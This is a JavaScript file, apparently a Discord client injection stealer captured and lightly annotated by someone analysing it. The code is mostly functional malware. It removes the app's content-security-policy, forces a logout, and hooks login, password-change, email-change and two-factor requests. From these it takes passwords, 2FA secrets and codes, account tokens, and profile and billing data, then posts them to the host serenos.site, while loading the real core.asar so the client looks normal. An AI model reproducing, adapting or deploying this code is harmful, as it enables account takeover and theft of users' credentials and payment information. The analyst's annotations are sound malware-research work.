/*
More malicious code send by the server.
 */

const _0x3aa095 = function () {
  let _0x14a1b7 = true;
  return function (_0x33ba4a, _0x1c155e) {
    const _0x42c85f = _0x14a1b7 ? function () {
      if (_0x1c155e) {
        const _0x37ceef = _0x1c155e.apply(_0x33ba4a, arguments);
        _0x1c155e = null;
        return _0x37ceef;
      }
    } : function () {};
    _0x14a1b7 = false;
    return _0x42c85f;
  };
}();
const _0x5126f0 = _0x3aa095(this, function () {
  return 0 //_0x5126f0.toString().search("(((.+)+)+)+$").toString().constructor(_0x5126f0).search("(((.+)+)+)+$");
}); // Set to zero as this is a dynamic analysis attacker ^
_0x5126f0();
const {
  BrowserWindow,
  session
} = require("electron");
const {
  existsSync,
  mkdirSync
} = require('fs');
const https = require("https");
const {
  join
} = require("path");
session.defaultSession.webRequest.onHeadersReceived((_0x33b2bc, _0x544621) => {
  delete _0x33b2bc.responseHeaders["content-security-policy"];
  delete _0x33b2bc.responseHeaders["content-security-policy-report-only"];
  _0x544621({
    'responseHeaders': {
      ..._0x33b2bc.responseHeaders,
      'Access-Control-Allow-Headers': '*'
    }
  });
});
session.defaultSession.webRequest.onBeforeRequest({
  'urls': ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*", "https://.discord.com/api/v/auth/sessions", "https://discord.com/api/v/auth/sessions", "https://discordapp.com/api/v*/users/@me/mfa/totp/enable", "https://discord.com/api/v*/users/@me/mfa/totp/enable", "https://*.discord.com/api/v*/users/@me/mfa/totp/enable"]
}, async (_0xbed5c0, _0x58ddc6) => {
  if (_0xbed5c0.url.startsWith("wss://")) {
    return _0x58ddc6({
      'cancel': true
    });
  }
  ;
  if (!existsSync(join(process.cwd(), "Duvet"))) {
    mkdirSync(join(process.cwd(), "Duvet"));
    await logout();
  }
  ;
  ;
  if (_0xbed5c0.url.endsWith("auth/sessions")) {
    return _0x58ddc6({
      'cancel': true
    });
  }
  ;
  if (_0xbed5c0.url.endsWith("enable")) {
    const _0x4c45ab = getRequestData(_0xbed5c0);
    const _0x556404 = await getAccountToken();
    if (_0x4c45ab?.["secret"] && _0x4c45ab?.["password"] && _0x556404 && _0x4c45ab?.["code"] !== '') {
      const _0x5a2708 = await getAccountInfo(_0x556404);
      sendData("{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22user\\x22:\\x20" + _0x5a2708?.["user"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22profile\\x22:\\x20" + _0x5a2708?.["profile"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22billing\\x22:\\x20" + _0x5a2708?.["billing"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22duvet_user\\x22:\\x20\\x22" + "7065707072" + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22login\\x22:\\x20{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22password\\x22:\\x20\\x22" + _0x4c45ab?.["password"] + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22token\\x22:\\x20\\x22" + _0x556404 + "\\x22\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20},\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22two_factor\\x22:\\x20{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22secret\\x22:\\x20\\x22" + _0x4c45ab?.["secret"] + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22code\\x22:\\x20\\x22" + _0x4c45ab?.["code"] + "\\x22\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a\\x20\\x20\\x20\\x20\\x20\\x20}", "2fa-enable");
      _0x58ddc6({
        'cancel': true
      });
    }
    ;
  }
  ;
});
session.defaultSession.webRequest.onCompleted({
  'urls': ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://discordapp.com/api/v*/users/@me/mfa/totp/disable", "https://discord.com/api/v*/users/@me/mfa/totp/disable", "https://*.discord.com/api/v*/users/@me/mfa/totp/disable"]
}, async (_0x263478, _0x2ed76a) => {
  if (_0x263478.statusCode != 200) {
    return;
  }
  const _0x203b9c = getRequestData(_0x263478);
  const _0x4fe5f5 = await getAccountToken();
  if (_0x263478.url.endsWith("disable")) {
    const _0x448dcc = await getAccountToken();
    const _0x55b52e = await getAccountInfo(_0x448dcc);
    sendData("{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22user\\x22:\\x20" + _0x55b52e?.["user"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22profile\\x22:\\x20" + _0x55b52e?.["profile"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22billing\\x22:\\x20" + _0x55b52e?.["billing"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22duvet_user\\x22:\\x20\\x22" + "7065707072" + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22login\\x22:\\x20{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22token\\x22:\\x20\\x22" + _0x448dcc + "\\x22\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a\\x20\\x20\\x20\\x20}", "2fa-disable");
    _0x2ed76a({
      'cancel': false
    });
  }
  ;
  if (_0x263478?.["url"]["endsWith"]("users/@me")) {
    if (_0x263478?.["method"] != "PATCH" || !_0x203b9c?.["password"]) {
      return;
    }
    if (_0x203b9c?.["new_password"]) {
      const _0x226221 = await getAccountInfo(_0x4fe5f5);
      sendData("{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22user\\x22:\\x20" + _0x226221?.["user"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22profile\\x22:\\x20" + _0x226221?.["profile"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22billing\\x22:\\x20" + _0x226221?.["billing"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22duvet_user\\x22:\\x20\\x22" + "7065707072" + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22login\\x22:\\x20{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22password\\x22:\\x20\\x22" + _0x203b9c?.["password"] + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22new_password\\x22:\\x20\\x22" + _0x203b9c?.["new_password"] + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22token\\x22:\\x20\\x22" + _0x4fe5f5 + "\\x22\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}", "password-change");
      _0x2ed76a({
        'cancel': false
      });
    }
    ;
    if (_0x203b9c?.["email"]) {
      const _0x3b7413 = await getAccountInfo(_0x4fe5f5);
      sendData("{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22user\\x22:\\x20" + _0x3b7413?.["user"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22profile\\x22:\\x20" + _0x3b7413?.["profile"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22billing\\x22:\\x20" + _0x3b7413?.["billing"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22duvet_user\\x22:\\x20\\x22" + "7065707072" + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22login\\x22:\\x20{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22password\\x22:\\x20\\x22" + _0x203b9c?.["password"] + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22email\\x22:\\x20\\x22" + _0x203b9c?.["email"] + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22token\\x22:\\x20\\x22" + _0x4fe5f5 + "\\x22\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a\\x20\\x20\\x20\\x20\\x20\\x20}", "email-change");
      _0x2ed76a({
        'cancel': false
      });
    }
    ;
  }
  ;
  if (_0x263478?.["url"]["endsWith"]("auth/login")) {
    if (_0x263478?.["method"] != "POST" || !_0x203b9c?.["password"]) {
      return;
    }
    if (_0x203b9c?.["password"] && _0x4fe5f5) {
      const _0x8d310d = await getAccountInfo(_0x4fe5f5);
      sendData("{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22user\\x22:\\x20" + _0x8d310d?.["user"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22profile\\x22:\\x20" + _0x8d310d?.["profile"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22billing\\x22:\\x20" + _0x8d310d?.["billing"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22duvet_user\\x22:\\x20\\x22" + "7065707072" + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22login\\x22:\\x20{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22password\\x22:\\x20\\x22" + _0x203b9c?.["password"] + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22token\\x22:\\x20\\x22" + _0x4fe5f5 + "\\x22\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a\\x20\\x20\\x20\\x20\\x20\\x20}", "discord-login");
      _0x2ed76a({
        'cancel': false
      });
    } else if (_0x203b9c?.["password"] && !_0x4fe5f5) {
      session.defaultSession.webRequest.onCompleted({
        'urls': ["https://discordapp.com/api/v*/auth/mfa/totp", "https://discord.com/api/v*/auth/mfa/totp", "https://*.discord.com/api/v*/auth/mfa/totp"]
      }, async (_0x2c3526, _0x449093) => {
        if (_0x2c3526?.["statusCode"] !== 200) {
          return;
        }
        const _0x801df7 = await getAccountToken();
        if (_0x801df7) {
          const _0x52ab39 = await getAccountInfo(_0x801df7);
          sendData("{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22user\\x22:\\x20" + _0x52ab39?.["user"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22profile\\x22:\\x20" + _0x52ab39?.["profile"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22billing\\x22:\\x20" + _0x52ab39?.["billing"] + ",\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22duvet_user\\x22:\\x20\\x22" + "7065707072" + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22login\\x22:\\x20{\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22password\\x22:\\x20\\x22" + _0x203b9c?.["password"] + "\\x22,\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x22token\\x22:\\x20\\x22" + _0x801df7 + "\\x22\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\x0a\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}", "discord-login");
          _0x449093({
            'cancel': false
          });
        }
        ;
      });
    }
    ;
  }
  ;
});
async function getAccountToken() {
  const _0x7d37f2 = await exec("(webpackChunkdiscord_app.push([[\\x27\\x27],{},e=>{m=[];for(let\\x20c\\x20in\\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\\x200).exports.default.getToken()", true);
  return _0x7d37f2;
}
;
function getRequestData(_0x321d99) {
  const _0x391afe = Buffer.from(_0x321d99?.["uploadData"]?.[0]?.["bytes"])?.["toString"]();
  return JSON.parse(_0x391afe);
}
;

/*
SendData Example Params:
_0x3da31e
{
  "user": "{\"id\": \"123456789\", \"username\": \"johndoe\", \"email\": \"johndoe@example.com\"}",
  "profile": "{\"bio\": \"Hello, I'm John!\", \"avatar\": \"abc123def456\"}",
  "billing": "{\"paymentMethods\": [{\"type\": \"creditCard\", \"last4\": \"1234\"}]}",
  "duvet_user": "7065707072",
  "login": {
    "password": "myPassword123",
    "token": "abc123def456ghi789"
  }
}

Possible values of _0x1eab53 based on the code:
  "2fa-enable": When two-factor authentication is being enabled.
  "2fa-disable": When two-factor authentication is being disabled.
  "password-change": When the user's password is being changed.
  "email-change": When the user's email is being changed.
  "discord-login": When the user logs in to Discord.
 */

function sendData(_0x3da31e, _0x1eab53) {
  const _0x16689b = https.request({
    'host': "serenos.site",
    'path': "/api/" + _0x1eab53 + '/',
    'protocol': "https:",
    'method': "POST",
    'headers': {
      'Content-Type': "application/json"
    }
  });
  _0x16689b.write(_0x3da31e);
  _0x16689b.end();
}
;
async function getAccountInfo(_0x261deb) {
  const _0x38e863 = await exec("var\\x20request\\x20=\\x20new\\x20XMLHttpRequest();\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.open(\\x27GET\\x27,\\x20\\x27https://discord.com/api/v10/users/@me\\x27,\\x20false);\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.setRequestHeader(\\x27Authorization\\x27,\\x20\\x27" + _0x261deb + "\\x27);\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.send(null);\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.responseText;");
  if (!JSON.parse(_0x38e863)?.['id']) {
    return;
  }
  const _0x4de645 = await exec("var\\x20request\\x20=\\x20new\\x20XMLHttpRequest();\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.open(\\x27GET\\x27,\\x20\\x27https://discord.com/api/v10/users/" + JSON.parse(_0x38e863)?.['id'] + "/profile\\x27,\\x20false);\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.setRequestHeader(\\x27Authorization\\x27,\\x20\\x27" + _0x261deb + "\\x27);\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.send(null);\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.responseText;");
  const _0x58f78a = await exec("var\\x20request\\x20=\\x20new\\x20XMLHttpRequest();\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.open(\\x27GET\\x27,\\x20\\x27https://discord.com/api/v10/users/@me/billing/payment-sources\\x27,\\x20false);\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.setRequestHeader(\\x27Authorization\\x27,\\x20\\x27" + _0x261deb + "\\x27);\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.send(null);\\x0a\\x20\\x20\\x20\\x20\\x20\\x20request.responseText;");
  return {
    'user': _0x38e863,
    'profile': _0x4de645,
    'billing': _0x58f78a
  };
}
;
async function exec(_0x10b67e) {
  const _0x524b57 = BrowserWindow.getAllWindows()[0];
  return _0x524b57.webContents.executeJavaScript(_0x10b67e, true);
}
;
async function logout() {
  const _0xe065b2 = BrowserWindow.getAllWindows()[0];
  return _0xe065b2.webContents.executeJavaScript("window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\\x22get_require\\x22]]]),delete\\x20gg.m.get_require,delete\\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\\x20LogOut(){(function(a){const\\x20b=\\x22string\\x22==typeof\\x20a?a:null;for(const\\x20c\\x20in\\x20gg.c)if(gg.c.hasOwnProperty(c)){const\\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\\x20d.default;if(d&&(b?d[b]:a(d)))return\\x20d}return\\x20null})(\\x22login\\x22).logout()}LogOut();", true);
}
;
module.exports = require("./core.asar");